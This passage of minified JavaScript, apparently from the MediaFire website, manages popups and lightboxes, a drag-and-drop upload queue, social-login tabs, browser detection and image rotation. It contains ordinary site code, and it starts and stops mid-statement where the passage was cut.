ayr(e,t,a,o){a||(a=function(){}),$.ajax({type:"GET",url:"/dynamic/log_promo_click.php?r="+aC(4),dataType:"json",data:{promo:e,ad:t,view_count:o||0,response_format:"json",nocache:Math.round(1e3*Math.random())},success:a.success||a,error:a.error||function(){}})}function GetViewportSize(){var e,t;return void 0!==window.innerWidth?(e=window.innerWidth,t=window.innerHeight):void 0!==document.documentElement&&void 0!==document.documentElement.clientWidth&&0!=document.documentElement.clientWidth?(e=document.documentElement.clientWidth,t=document.documentElement.clientHeight):(e=document.getElementsByTagName("body")[0].clientWidth,t=document.getElementsByTagName("body")[0].clientHeight),[e,t]}function aj(e,t,a){DoAPopup(e,t,a)}function LoadIframeLightbox(e,t,a,o,n,r,i,s,l,d){var c={};o&&(c.absolute=o),n&&(c.top=n),r&&(c.hideCloseButton=r),i&&(c.queue=i),s&&(c.forceUserAction=s),l&&(c.onLoadCallback=l),d&&(c.transparent=d),blu(e,t,a,c)}function announceLightBox(){try{$("#modal_msg_iframe").on("load",(function(){$iframeBody=$("#modal_msg_iframe").contents().find("body"),$iframeBody.attr("aria-live","rude"),document.getElementById("modal_msg_iframe").contentWindow.focus(),$iframeBody.hide().show()}))}catch(e){}}function blu(e,t,a,o){var n={absolute:!1,top:null,hideCloseButton:!1,queue:!1,forceUserAction:!1,onLoadCallback:null,onCloseCallback:null,transparent:!1,delayRender:!1,id:"modal_window_popup",iframe:"modal_msg_iframe"},r=$.extend({},n,o),i="uploader_window_popup"===r.id,s=function(){var e=$("#"+r.id),t=$("a.popup-close",e);t.toggle(!r.hideCloseButton),e.show(),announceLightBox(),!r.hideCloseButton&&r.onCloseCallback&&t.one("click",(function(){r.onCloseCallback()}))},l=document.getElementById(r.id);if(r.onLoadCallback||r.delayRender){var d=$("#"+r.iframe);d&&(d.off("load"),d.one("load",(function(){r.onLoadCallback&&r.onLoadCallback(),r.delayRender&&s()})))}if("block"==l.style.display&&r.queue){var c=$("#"+r.iframe).attr("src").split("?")[0];if(c!=e){var f=Array.prototype.join.call(arguments,",");-1===aPopupQueue.indexOf(f)&&aPopupQueue.push(f)}}else if(0!=pN(e+(e.indexOf("?")>-1?"&":"?")+"_"+aC(5)+"="+db(1e3,5e3),r.iframe)){if(r.forceUserAction?($("#page_screen").off("click"),document.onkeyup=function(e){return aeV(e),!1}):$("#page_screen").off("click").on("click",(function(){r.onCloseCallback&&r.onCloseCallback(),QU()})),$("#"+r.id).hide(),i||(dZ(),$("body").addClass("lightboxActive")),r.transparent&&$("#"+r.id).addClass("transparentBG"),-1!==l.className.indexOf("widget-lightbox")){var u=$(".web-widget");u.length>0&&(t=Math.min(t,u.outerWidth()-20),a=Math.min(a,u.outerHeight()-20),mw(r.iframe,t,a))}else mw(r.iframe,t-0,a-0);-1!==e.indexOf("/templates/tos.php")&&$("body").hasClass("mobile-device")&&$("body").addClass("modalMobile"),baq(r.id,t,a,r.absolute,r.top,null,!0),r.delayRender||s()}}function DoAPopup(e,t,a,o){dZ(),baq(e,t,a,void 0,void 0,o)}function bfM(e){baj(e)}function ban(e,t,a){baq(e,t,a)}function bag(e){baj(e,!0)}function aem(){var e=0,t=0;return"number"==typeof window.innerWidth?(e=window.innerWidth,t=window.innerHeight):document.documentElement&&(document.documentElement.clientWidth||document.documentElement.clientHeight)?(e=document.documentElement.clientWidth,t=document.documentElement.clientHeight):document.body&&(document.body.clientWidth||document.body.clientHeight)&&(e=document.body.clientWidth,t=document.body.clientHeight),{h:t,w:e}}function afp(e,t,a,o,n){var r=aem();if(bJ=Math.round((r.w-t)/2),bJ<0&&(bJ=0),e.style.left=bJ+"px",!o){var i=$(window).scrollTop();(n=i+Math.round((r.h-a)/2))<i&&(n=i)}e.style.top=n+"px"}function baq(e,t,a,o,n,r,i){var s=document.getElementById(e);if(!s)return!1;if(-1!==s.className.indexOf("widget-lightbox")){var l=$(".web-widget");$(s);l.length>0&&(s.style.top=Math.max(0,(l.outerHeight()-a)/2)+"px",s.style.left=Math.max(0,(l.outerWidth()-t)/2)+"px",s.style.maxWidth=l.outerWidth(!0)+"px",s.style.width="auto")}else $("body").hasClass("modalMobile")?(s.style.width="100%",s.style.height="100%",s.style.top="0",s.style.bottom="0",s.style.left="0",s.style.right="0"):(afp(s,t,a,o,n),s.style.width=t+"px",s.style.height=r?"auto":a+"px",$(window).on("scroll resize",(function(){afp(s,t,a,o,n)})));s.style.zIndex="uploader_window_popup"===e?1e3:1007,i||(s.style.display="block",announceLightBox())}function mw(e,t,a){var o=document.getElementById(e);if(!o)return!1;w=t,h=a,$("body").hasClass("mobile-device")?(o.style.width="100%",o.style.height="100%"):(o.style.width=w+"px",o.style.height=h+"px")}function baj(e,t){if("uploader_window_popup"!==e){var a=document.getElementById(e);if(a){if(aZv=$("#page_screen"),aZv.off("click").on("click",QU),document.onkeyup=function(e){27==(window.event&&window.event.keyCode?window.event.keyCode:e.keyCode?e.keyCode:e.charCode)&&QU()},a.style.display="none",$("#modal_window_popup").removeClass("transparentBG"),bfZ()||1==t||cU(),"/blank.html"!=$("#modal_msg_iframe").attr("src")&&pN("/blank.html","modal_msg_iframe"),aPopupQueue.length>0){var o=aPopupQueue.shift().split(",",6);setTimeout((function(){LoadIframeLightbox.apply(this,o)}),500)}$("body").removeClass("modalMobile"),$("body").removeClass("lightboxActive")}}}function bjM(e,t,a,o){var n=[];t=void 0===t?"/":t,a=void 0===a?document.domain:a,o=void 0===o||o;for(var r=document.cookie.split(";").length,i=document.cookie.split(/; ?/),s=0;s<i.length;s++)for(var l=i[s].split("="),d=0;d<e.length;d++){var c=e[d];if((!o||c.toLowerCase()==l[0].toLowerCase())&&(o||c==l[0])){var f=l[0]+"=;";f+="expires=Thu, 01 Jan 1970 00:00:01 GMT;",f+="domain={d};",f+="path="+t+";",document.cookie=f.replace("{d}",a);var u=document.cookie.split(";").length;r>u&&(n.push(c),e.shift(d,1),r=u);break}}return n}function dZ(){var e=document.getElementById("page_screen");e&&!$("#MediaFireStepBlanket:visible").length&&(e.style.display="block",opacity("page_screen",0,65,200))}function cU(){document.getElementById("page_screen")&&(opacity("page_screen",65,0,100),cO())}function cO(){var e=document.getElementById("page_screen");if(!e)return!1;e.style.display="none"}function au(e){return null!=e&&null!=e.options}function at(e){if(au(e)){for(var t=e.options.length-1;t>=0;t--)e.options[t]=null;e.selectedIndex=-1}}function kP(e,t,a,o){if(null!=e&&null!=e.options){var n=document.createElement("OPTION");n.text=t,n.value=a,n.selected=o,e.options[e.options.length]=n}}function DoHide(e){var t;(t=document.getElementById(e))&&"hide"!=t.className&&(t.className="hide")}function DoShow(e){var t;(t=document.getElementById(e))&&"show"!=t.className&&(t.className="show")}function nd(e){var t;(t=document.getElementById(e))&&t.innerHTML&&(t.innerHTML="")}function al(e){if("string"==typeof e&&(e=document.getElementById(e)),e&&e.value&&void 0===e.rH){var t=(a=e,function(){a.value="",a.onclick="",a.onblur=""});e.onclick=t,e.onblur=t,e.rH=1}var a}function aA(e,t){if("string"==typeof e&&(e=document.getElementById(e)),e){var a=e.value.match(/\n/g),o=1;if(a&&(o+=a.length+1),o>t)return!1}return!0}function baD(e){var t=document.getElementById(e);return!!t&&"block"==t.style.display}function GetThis(e,t,a,o){var n="http://www.myspace.com/Modules/PostTo/Pages/?t="+encodeURIComponent(e)+"&c="+encodeURIComponent(t)+"&u="+encodeURIComponent(a)+"&l="+o;window.open(n)}function LoadJS(e,t,a,o,n){var r=document.createElement("script");r.setAttribute("type","text/javascript"),r.setAttribute("src",e),document.getElementsByTagName("head")[0].appendChild(r);try{"function"==typeof t&&"function"==typeof a&&o>0&&setTimeout(sk(this,CS,e,t,a,o,void 0,n),200)}catch(e){}}function CS(e,t,a,o,n,r){void 0===n&&(n=0),t()?a():5*o<n?(Ku(3,e),"function"==typeof r&&r()):setTimeout(sk(this,CS,e,t,a,o,n+1,r),200)}function CU(e,t,a){"function"!=typeof e&&(e=function(){}),"function"!=typeof t&&!a&&sCDNUrl&&(t=sk(this,CU,e,!1,!0));var o=sCDNUrl;!0===a&&(o=""),LoadJS(o+"/js/templates_"+BUILD_VERSION+".js",(function(){return!("undefined"==typeof eH)}),e,o?4:10,t)}function aeV(e){e&&e.stopPropagation?e.stopPropagation():window.event&&(window.event.cancelBubble=!0)}function JZ(){var e=!1;try{e="function"==typeof window.FileReader}catch(e){}return e}function Ty(){var e=!1;try{e="draggable"in document.createElement("span")}catch(e){}return e}function LU(){return!(!JZ()||!Ty()||apB())||"Mac"==lc()&&"Safari"==BrowserName()&&!apB()}String.prototype.capitalize=function(){return this.charAt(0).toUpperCase()+this.slice(1)},Array.prototype.multiSort=function(e){for(var t=0,a=this.length;t<a;t++){var o=this[t].splice(e,1);this[t].unshift(o)}return"function"==typeof this.sort?this.sort():[]},function(){try{jQuery(window).resize(OJ)}catch(e){}OJ(),OD()}(),window.HideAPopupPar=function(e){bfM(e)},String.prototype.trim=function(){return this.replace(/^\s+|\s+$/g,"")},String.prototype.ltrim=function(){return this.replace(/^\s+/,"")},String.prototype.rtrim=function(){return this.replace(/\s+$/,"")},String.prototype.stripTags=function(){return this.replace(/<\/?[^>]+>/gi,"")},window._syncUploads=function(e,t,a){var o,n=a?a.split("/").length-1:-1;if($.each(window.tH.aca,(function(e,a){a.quickkey&&a.quickkey===t&&(o=e)})),n<1){var r=window.tH.folders.yx(e);if(r&&t){var i=new window.tH.Cp(t,r),s=!1;window.tH.sh=!0;var l=function(t,a,r){window.tH.files.Yx(t.quickkey,t),r||a.file_count++,window.tH.folders.Yx(a.folderkey,a),aHa&&aHa.aIX&&(aHa.aIX(a.folderkey),e!=a.folderkey&&aHa.aIX(e)),-1==n&&(aqG(),$.publish("file/upload",[t,o?"update":"new"])),window.tH.sh=!1};i.Yw((function(e){var t=e.response&&e.response.file_info.parent_folderkey;if(i.parent=r,0==n&&t){var a=window.tH.folders.yx(t);a?(r=a,i.parent=r):(r=new window.tH.yJ(t,r),i.parent=r,s=!0,r.Yw((function(){aoQ(r),r.file_count=1,l(i,r,!0)})))}s||l(i,r)}))}}try{gtag("event","upload")}catch(e){}try{window.sendinblue.track("UPLOAD")}catch(e){}};var uploaderOptionsCache=null;function GLB_getUploaderOptions(e,t){if(uploaderOptionsCache)return t(!0,uploaderOptionsCache);var a=0,o=0,n=e&&e.length?e.length:0;if(n>0)for(var r=0;r<n;r++){var i=e[r];o+=i.size,i.size>a&&(a=i.size)}var s=new XMLHttpRequest;s.addEventListener("load",(function(){var e;try{e=JSON.parse(this.responseText)}catch(e){}if(!e||!e.response)return t(!1);var r=e.response;return uploaderOptionsCache=r,r.new_uploader?n?n>=r.threshold_file_count||a>=r.threshold_file_size||o>=r.threshold_total_size?t(!0,r):t(!1):t(!0,r):t(!1)})),s.open("GET","/application/upload_options.php"),s.send()}function aWj(e,t,a){try{if(!(e.dataTransfer||e.originalEvent.dataTransfer).types.contains("Files"))return}catch(e){}e.stopPropagation(),e.preventDefault();var o={},n="";if(a||void 0===window.tH||void 0===window.tH.folders)if(a){try{if(!avH((o=window.tH.folders.memory[a]).flag,"1"))if(2!=NZ(o))return void Zi(0,"You do not have permission to upload to this folder.")}catch(e){}n=a}else n="myfiles";else if((n=$(e.originalEvent.target).closest(".folder").data("key"))?o=window.tH.folders.memory[n]:n=(o=window.tH.currentFolder).folderkey,!avH(o.flag,"1")&&2!=NZ(o))return void Zi(0,"You do not have permission to upload to this folder.");n&&($("#folder-"+n).removeClass("folder_highlight"),GLB_fSendToUploader(n,t)),"function"==typeof xf&&xf(o,e)}function GLB_fLoadNewUploader(e,t,a){var o="__UPLOADS__"in window?++window.__UPLOADS__:window.__UPLOADS__=1,n="__UPLOADER:"+o+"__";window[n]={},window[n].config=t,window[n].folder=e,window[n].sizeLimit=t.file_size_limit,a&&a.length>0&&(window[n].files=a),blu("/uploader/?id="+o,780,500,{id:"uploader_window_popup",iframe:"uploader_msg_iframe",forceUserAction:!0,hideCloseButton:!0,delayRender:!0})}var eUploadIframe=$("#uploader_msg_iframe")[0],aUploaderQueue=[],bUploaderActive=!1;function GLB_fIsUploaderLoaded(){return"none"===document.getElementById("uploader_window_popup").style.display?(pN("/blank.html","uploader_msg_iframe"),bUploaderActive=!1,!1):bUploaderActive}function GLB_fInitUploader(e,t,a){bUploaderActive=!1,window.addEventListener("message",(function(e){e&&"mf-uploader-init"===e.data?(bUploaderActive=!0,GLB_fPushUploads()):!fu&&e&&"mf-filesize-limit"===e.data&&(window.FileLimitUpsellLightbox&&window.FileLimitUpsellLightbox.showUpsell(),document.getElementById("uploader_window_popup").style.display="none")}),!1),GLB_fLoadNewUploader(e,t,a)}function GLB_fPushUploads(){for(var e=0;e<aUploaderQueue.length;e++){var t=aUploaderQueue[e];t&&eUploadIframe.contentWindow.postMessage({event:"add",folder:t[0],files:t[1]},"*")}aUploaderQueue=[]}function GLB_fSendToUploader(e,t){GLB_getUploaderOptions(t,(function(a,o){return o.new_uploader_messaging?GLB_fIsUploaderLoaded()?(t&&t.length&&aUploaderQueue.push([e,t]),!aUploaderQueue.length&&bUploaderActive?eUploadIframe.contentWindow.postMessage({event:"prompt"},"*"):bUploaderActive?GLB_fPushUploads():void 0):GLB_fInitUploader(e,o,t):GLB_fLoadNewUploader(e,o,t)}))}function biM(e,t,a){var o=[],n=0;function r(e){console.error("error code: "+e.code)}function i(e,t){var a=[],o=function(){n++,e.readEntries((function(e){var r;e.length?(a=a.concat((r=e,Array.prototype.slice.call(r||[],0))),n--,o()):(a.sort(),n--,t(a))}),r)};o()}var s=[],l=!1;if(e)for(var d=0;d<e.length&&e[d].webkitGetAsEntry;d++)s[d]=e[d].webkitGetAsEntry(),s[d]&&s[d].isDirectory&&(l=!0);l?function e(t){for(t<=0&&a(o),d=0;d<t.length;d++)if(t[d])if(t[d].isDirectory){i(t[d].createReader(),e)}else{var s=t[d].fullPath.slice(1).split("/");s.pop(),s=s.join("/"),n++,t[d].file((function(e){n--,e.MFRelativePath=s+"/"+e.name,o.push(e),n<=0&&a(o)}),r)}}(s):a(t)}var wK,vc=[];function LT(e,t,a,o,n,r,i){if(LU()&&!apB()){$("body").addClass("html5");var s=e;if("string"==typeof e&&(s=document.getElementById(e)),s){Me(s);var l=function(e,t){return function(a){try{if(!(a.dataTransfer||a.originalEvent.dataTransfer).types.contains("Files"))return;if($("#container").hasClass("trashMode"))return}catch(a){}a.stopPropagation(),a.preventDefault(),"function"==typeof t&&(-1!=navigator.userAgent.indexOf("Chrome")?setTimeout((function(){t(e,a)}),1):t(e,a))}}(t,a),d=p(t,o),c=p(t,n),f=function(e,t,a){return function(e){e.stopPropagation(),e.preventDefault();var a=e.originalEvent.dataTransfer.files,o=e.originalEvent.dataTransfer.items?e.originalEvent.dataTransfer.items:null;!$("#container").hasClass("trashMode")&&a.length>0&&biM(o,a,(function(a){aXY((function(o){aWj(e,a,t)}),a)}))}}(0,t);i?jQuery(s).bind({draghoverover:a,dragover:d,draghoverout:n,drop:f}):jQuery(s).bind({dragenter:l,dragover:d,dragleave:c,drop:f});var u=vc[s.id]=[];u.dragenter=l,u.dragover=d,u.drop=f}}function p(e,t){return function(a){try{if(!(a.dataTransfer||a.originalEvent.dataTransfer).types.contains("Files"))return;if($("#container").hasClass("trashMode"))return}catch(a){}a.stopPropagation(),a.preventDefault(),"function"==typeof t&&t(e,a)}}}function Me(e){var t=e;if("string"==typeof e&&(t=document.getElementById(e)),t){if(vc[t.id]){var a=vc[t.id];return jQuery(t).unbind({dragenter:a.dragenter,dragover:a.dragover,drop:a.drop}),vc[t.id]=[],!0}return!1}}function Md(e,t){if("undefined"==typeof MFUL)LoadUploader(),setTimeout(sk(this,Md,e,t),200);else{var a=0;void 0!==t&&(a=MFUL.LZ(t,!0));var o=MFUL.aUploaders[a];o.mAddFilesFromHtml5(e,sk(this,(function(e,t){var o=document.getElementById("pagename");!o||"upload"!==o.value&&"myfiles"!==o.value||MFUL.Bq(a),t&&e.IK()}),o))}}function lc(){if(navigator&&navigator.platform){if(-1!=navigator.platform.indexOf("Win"))return"Windows";if(-1!=navigator.platform.indexOf("Mac"))return"Mac";if(-1!=navigator.platform.indexOf("X11"))return"UNIX";if(-1!=navigator.platform.indexOf("Linux"))return"Linux"}return"Unknown OS"}function akQ(e){blX("Login")}function akT(){$("#headerlogin_tab").find("span").fadeOut(150),$("#main_login").fadeOut(150)}function vQ(e,t){void 0===t&&(t=!1);try{switch(mf=document.getElementById("login_mediafire"),fb=document.getElementById("login_facebook"),tw=document.getElementById("login_twitter"),mft=document.getElementById("login_tab_mediafire"),fbt=document.getElementById("login_tab_facebook"),twt=document.getElementById("login_tab_twitter"),e){case 2:fbt.className="current",fb.className="current",mft.className=1==UserLogin?"login_tab_inactive":"",twt.className=wL?"login_tab_inactive":"",mf.className=tw.className="login_hide",bis((function(e){wP(1)}));break;case 3:twt.className="current",tw.className="current",mft.className=1==UserLogin?"login_tab_inactive":"",fbt.className=wM?"login_tab_inactive":"",mf.className=fb.className="login_hide",yA(t);break;case 1:default:mft.className="current",mf.className="current",fbt.className=wM?"login_tab_inactive":"",twt.className=wL?"login_tab_inactive":"",fb.className=tw.className="login_hide",$("#login_email").focus()}}catch(e){}}function wG(e){wL=1,1==e&&wD(wK),2==e&&(window.location="/register.php?connect=twitter")}function wg(e,t,a,o){(sharediv=document.getElementById("sharediv"+e))&&"hide"==sharediv.className&&(sharediv.innerHTML=Bf(eH[o],a,e,""),sharediv.className="actions"),ae("sharetabsfile"+e+"-",5),Xc(4,document.getElementById("sharetemplatefile"+e),e,"sharedtabsfileinfo"+e+"-"),document.getElementById((1==t?"fb":"tw")+"_share_checkbox"+e).checked=!0,document.getElementById((2==t?"fb":"tw")+"_share_checkbox"+e).checked=!1}function vS(e){document.getElementById("fb_share_checkbox"+e).checked=wM,document.getElementById("tw_share_checkbox"+e).checked=wL}function wP(e,t){for(var a,o=0;a=document.getElementById("facebook_login_"+o);o++)a.style.display=e==o?"inline":"none",(a=document.getElementById("fb_error_step"+o))&&("string"==typeof t&&e==o?(a.innerHTML=t,a.style.display="block"):a.style.display="none")}function wX(e,t){for(var a,o=0;a=document.getElementById("twitter_login_"+o);o++)a.style.display=e==o?"inline":"none",(a=document.getElementById("tw_error_step"+o))&&("string"==typeof t&&e==o?(a.innerHTML=t,a.style.display="block"):a.style.display="none")}var aBG=!1;function bis(e){e=e||jQuery.noop,window.FB?(FB.init({version:FBAPIVersion.slice(0,-1),appId:FBAppId,xfbml:!0,status:!1,cookie:!0,oauth:!0}),e(FB)):$.getScript("//connect.facebook.net/en_US/sdk.js",(function(){bis(e)}))}function vZ(e){function t(e){var t;if(t=document.getElementById("facebook_app_id"))if(xS=t.value,-1!=String(document.cookie).indexOf("fbsr_"+xS)){var a=document.getElementById("fb_login_action"),o=document.getElementById("facebook_login_form");a&&o?(a.value="do_login",o.submit()):Zi(2,"Missing form element on page. Please contact support.")}else Zi(2,"Facebook cookie not set. Please contact support.");else Zi(2,"Facebook application not set. Please contact support.")}if(wP(2),e)bis((function(a){a.login((function(e){"connected"==e.status&&t()}),{scope:e})}));else{var a=new Array;a.push("email"),bis((function(e){e.login((function(e){"connected"==e.status&&t()}),{scope:a.join(",")})}))}}var beE=!1;function yA(){beE||($("#login_twitter .headerSocialButton").html('<iframe scrolling="no" frameborder="0" style="width: 160px; height: 20px; padding: 6px; float: left;margin-left:28px;" src="//platform.twitter.com/widgets/follow_button.html?screen_name=MediaFire&amp;show_count=true&amp;show_screen_name=false" allowtransparency="true"></iframe>'),beE=!0),wX(1)}function yz(){var e=document.getElementById("tw_login_action"),t=document.getElementById("twitter_login_form");e&&t?(e.value="post_twitter_authorize",t.submit()):Zi(2,"Missing form element on page. Please contact support.")}function wI(e){window.open("/dynamic/client_login/twitter.php?popup_twitter_login=1"+(e?"&callback="+e:""),"twitter_login","scrollbars=0,status=0,width=780,height=410")}function yF(e,t){var a=0;return""!==e&&(a="facebook"===(e=e.toLowerCase()||"")?yO:"twitter"===e?yP:3e4,yQ=function(){"function"==typeof t&&t(),Zi(3,"Authenticating with "+(e.substr(0,1).toUpperCase()+e.substr(1))+" timed out. Please make sure that your browser is not blocking pop-ups.")},setTimeout(sk(this,yQ),a))}var aqY={apA:function(){this.ark=this.aqj(this.aqe)||"An unknown browser",this.aqI=this.arp(navigator.userAgent)||this.arp(navigator.appVersion)||"an unknown version",this.apT=this.aqj(this.aqw)||"an unknown OS"},aqj:function(e){for(var t=0;t<e.length;t++){var a=e[t].abF,o=e[t].prop;if(this.aqq=e[t].apY||e[t].abG,a){if(-1!=a.indexOf(e[t].afF))return e[t].abG}else if(o)return e[t].abG}},arp:function(e){var t=e.indexOf(this.aqq);if(-1!=t)return parseFloat(e.substring(t+this.aqq.length+1))},aqe:[{abF:navigator.userAgent,afF:"Chrome",abG:"Chrome"},{abF:navigator.userAgent,afF:"OmniWeb",apY:"OmniWeb/",abG:"OmniWeb"},{abF:navigator.vendor,afF:"Apple",abG:"Safari",apY:"Version"},{prop:window.opera,abG:"Opera",apY:"Version"},{abF:navigator.vendor,afF:"iCab",abG:"iCab"},{abF:navigator.vendor,afF:"KDE",abG:"Konqueror"},{abF:navigator.userAgent,afF:"Firefox",abG:"Firefox"},{abF:navigator.vendor,afF:"Camino",abG:"Camino"},{abF:navigator.userAgent,afF:"Netscape",abG:"Netscape"},{abF:navigator.userAgent,afF:"MSIE",abG:"Explorer",apY:"MSIE"},{abF:navigator.userAgent,afF:"Gecko",abG:"Mozilla",apY:"rv"},{abF:navigator.userAgent,afF:"Mozilla",abG:"Netscape",apY:"Mozilla"}],aqw:[{abF:navigator.platform,afF:"Win",abG:"Windows"},{abF:navigator.platform,afF:"Mac",abG:"Mac"},{abF:navigator.userAgent,afF:"iPhone",abG:"iPhone/iPod"},{abF:navigator.platform,afF:"Linux",abG:"Linux"}]};function apB(){switch(aqY.ark){case"Explorer":if(aqY.aqI<8)return!0;break;case"Firefox":if(aqY.aqI<4)return!0;break;case"Safari":if(aqY.aqI<5)return!0;break;case"Opera":if(aqY.aqI<11)return!0}return!1}function BrowserName(){return"Microsoft Internet Explorer"==navigator.appName?"Internet Explorer":"Opera"==navigator.appName?"Opera":"Netscape"==navigator.appName?navigator.userAgent.indexOf("Firefox")>-1?"Firefox":navigator.userAgent.indexOf("OPR")>-1?"Opera":navigator.userAgent.indexOf("Chrome")>-1?"Chrome":navigator.userAgent.indexOf("Safari")>-1?"Safari":navigator.userAgent.indexOf("Trident")>-1?"Internet Explorer":"Netscape":navigator.appName}function getInternetExplorerVersion(){var e=-1;if("Microsoft Internet Explorer"==navigator.appName){var t=navigator.userAgent;null!=new RegExp("MSIE ([0-9]{1,}[.0-9]{0,})").exec(t)&&(e=parseFloat(RegExp.$1))}else if("Netscape"==navigator.appName){t=navigator.userAgent;null!=new RegExp("Trident/.*rv:([0-9]{1,}[.0-9]{0,})").exec(t)&&(e=parseFloat(RegExp.$1))}return Math.min(10,e)}function Bm(){var e;switch(BrowserName()){case"Internet Explorer":return getInternetExplorerVersion().toFixed(1);case"Firefox":e="Firefox/";break;case"Safari":case"Opera":e="Version ",navigator.userAgent.indexOf("OPR")&&(e="OPR/");break;case"Chrome":e="Chrome/"}if(e&&null!=new RegExp(e+"([0-9]+(.[0-9]+)*)").exec(navigator.userAgent))return navigator.userAgent.indexOf("Trident")&&"6.0"==RegExp.$1?"10.0":navigator.userAgent.indexOf("Trident")&&"5.0"==RegExp.$1?"9.0":navigator.userAgent.indexOf("Trident")&&"4.0"==RegExp.$1?"8.0":RegExp.$1;return-1}function uy(){return BrowserName()+" "+Bm()}function zl(e,t){if(elm=document.getElementById(e)){var a=elm.width-elm.height;90==t||270==t?"Internet Explorer 8.0"==uy()?elm.style.margin="0px 0px "+a+"px "+a+"px":"Internet Explorer 7.0"==uy()?elm.style.margin="0px":"Opera 10.60"==uy()?elm.style.margin=-a/2+"px 0px "+-a/2+"px 0px":elm.style.margin=a/2+"px 0px "+a/2+"px 0px":elm.style.margin="0px","Internet Explorer 7.0"==uy()&&(elm.width++,elm.width--)}}function FP(e,t){if(elm=document.getElementById(e)){var a=isNaN(a=parseInt(elm.className.substr(3)))?0:a,o=(a+("right"==t?90:270))%360;return elm.className="rot"+o,zl(e,o),o}return-1}function yZ(e,t,a){var o=FP(e,t);if(-1!=o){if(elmframe=document.getElementById("userwork")){var n="/dynamic/imagerotation.php?imgkey="+a+"&newrotation="+o+"&nocache="+Math.random();elmframe.location?elmframe.location=n:elmframe.src=n}try{es[aCurrentOrder[fg-1][0][1]][17]=o}catch(e){}}}function rW(e){var t=e.offsetWidth||0,a=e.offsetHeight||0;if(void 0!==e.childNodes)for(var o=0;o<e.childNodes.length;o++){var n;n=rW(e.childNodes[o]),t=Math.max(t,n[0]),a=Math.max(a,n[1])}return[t,a]}function Im(e){return e.height?e.height:e.style.height?parseInt(e.style.height):rW(e)[1]}function Io(){var e=window.pageYOffset?window.pageYOffset:document.documentElement&&document.documentElement.scrollTop?document.documentElement.scrollTop:document.body.scrollTop;if(e!=Ih){var t=window.innerHeight?window.innerHeight:document.documentElement&&document.documentElement.clientHeight?document.documentElement.clientHeight:document.body.clientHeight;try{if(MFUL)for(var a=0;a<MFUL.aUploaders.length;a++)for(var o=1;o<=7;o++)if(Iq=MFUL.aUploaders[a].aAb.azc[o].groupDivId,Ie=document.getElementById(Iq)){var n,r,i=Im(Ie);r=(n=i>t?Math.min(0,Math.max(t-i,parseInt(Ie.style.top)-(e-Ih))):Math.max(0,Math.min(t-i,parseInt(Ie.style.top))))-parseInt(Ie.style.top),Ie.style.top=n+"px",MFUL.aUploaders[a].aAb&&MFUL.aUploaders[a].aAb.qP&&(MFUL.aUploaders[a].aAb.qP.style.top=parseInt(MFUL.aUploaders[a].aAb.qP.style.top)+r+"px"),MFUL.aUploaders[a].qW&&(MFUL.aUploaders[a].qW.style.top=parseInt(MFUL.aUploaders[a].qW.style.top)+r+"px"),MFUL.aUploaders[a].BN&&MFUL.aUploaders[a].BN.wrapperDiv&&(MFUL.aUploaders[a].BN.wrapperDiv.style.top=parseInt(MFUL.aUploaders[a].BN.wrapperDiv.style.top)+r+"px")}}catch(e){}try{if(Id=document.getElementById("MediaFireSharePopup")){var s=Im(Id)+32;Id.style.top=s>t?Math.min(0,Math.max(t-s,parseInt(Id.style.top)-32-(e-Ih)))+32+"px":Math.max(0,Math.min(t-s,parseInt(Id.style.top)-32))+32+"px"}}catch(e){}Ih=e}}function It(){"Internet Explorer"==BrowserName()&&window.location.href.indexOf("#")>-1&&(document.title=Iu,setTimeout(sk(this,(function(){document.title=Iu})),200))}function Ku(e,t){}function uS(e,t){for(var a=[],o=t||0,n=e.length;o<n;o++)a.push(e[o]);return a}function sk(e,t){var a=uS(arguments,2);return function(){var o=uS(arguments,0);return t.apply(e,a.concat(o))}}function NQ(e){return e.preventDefault&&e.preventDefault(),e.returnValue=!1,!1}function indexOf(e,t){if([].indexOf)return Array.prototype.indexOf.call(e,t);for(var a=0;a<e.length;a++)if(e[a]==t)return a;return-1}function Uf(e,t){e.push(t)}function QO(e){try{return jQuery.browser.msie&&Number(jQuery.browser.version)<8?400:Math.max(450,e.offsetWidth)}catch(e){return 400}}function Qg(e,t,a,o,n,r,i){var s=document.getElementById("input_dialog_div");s||((s=document.createElement("DIV")).id="input_dialog_div",s.className="popup",document.body.appendChild(s));for(var l="",d=" var aResults = Array();",c=null,f=0;t[f];f++)if(t[f][0]){t[f][0]=t[f][0].replace('"',"&quot;").replace("'","\\'"),t[f][3]&&"string"==typeof t[f][3]&&(t[f][3]=t[f][3].replace('"',"&quot;")),t[f][5]&&(t[f][5]=t[f][5].replace('"',"&quot;").replace("'","\\'"));var u=t[f][6]?t[f][6].replace('"',"&quot;"):"",p=t[f][5]||"input_dialog_"+t[f][0];switch("function"==typeof a&&(d+=" aResults['"+t[f][0]+"'] = document.getElementById('"+p+"')."+("checkbox"==t[f][2]?"checked":"value")+";"),"checkbox"!=t[f][2]&&"hidden"!=t[f][2]&&(l+="<label>"+(t[f][1]||t[f][0])+"</label>"),t[f][2]){case"textarea":l+='<textarea id="'+p+'" placeholder="'+u+'" name="'+t[f][0]+'" style="margin-bottom: 10px" '+(t[f][4]?'rows="'+t[f][4]+'" ':"")+">"+(t[f][3]||"")+"</textarea>",c=c||p;break;case"checkbox":l+='<input id="'+p+'" type="checkbox" name="'+t[f][0]+'" '+(t[f][3]?'checked="checked" ':"")+' /><span style="color: #777">'+(t[f][1]||t[f][0])+"</span>";break;case"hidden":l+='<input id="'+p+'" type="hidden" name="'+t[f][0]+'" value="'+t[f][3]+'" />';break;case"html":l+=t[f][4];break;case"password":default:l+='<input id="'+p+'" type="'+("password"==t[f][2]?"password":"text")+'" placeholder="'+u+'" name="'+t[f][0]+'" style="margin-bottom: 10px; width: 365px;" '+(t[f][4]?'maxlength="'+t[f][4]+'" ':"")+'value="'+(t[f][3]||"")+'" />',c=c||p}}var h='<a href="#" onclick="HideAPopup(\'input_dialog_div\'); return false" class="popup-close"><span style="display: none;">Close Popup</span></a>';h+='<h3 class="popup-title">'+e+"</h3>","object"==typeof o&&o instanceof Array&&(h+='<form action="'+o[0]+'" method="'+(o[1]||"POST")+'" '+(o[2]?'target = "'+o[2]+'"':"")+" onsubmit=\"bfM('input_dialog_div');","function"==typeof a&&(PW=a,h+=d+" return PW(aResults);"),h+='">'),h+='<div class="popup-content">'+l+"</div>",h+='<div class="popup-btns">',"object"==typeof o&&o instanceof Array?h+='<input class="gbtnTertiary" type="submit" value="'+(n||"Submit")+'"><a href="#" onclick="bfM(\'input_dialog_div\'); return false;" class="gbtnPrimary">Cancel</a></div></form>':(h+='<a href="#" onclick="bfM(\'input_dialog_div\');',"function"==typeof 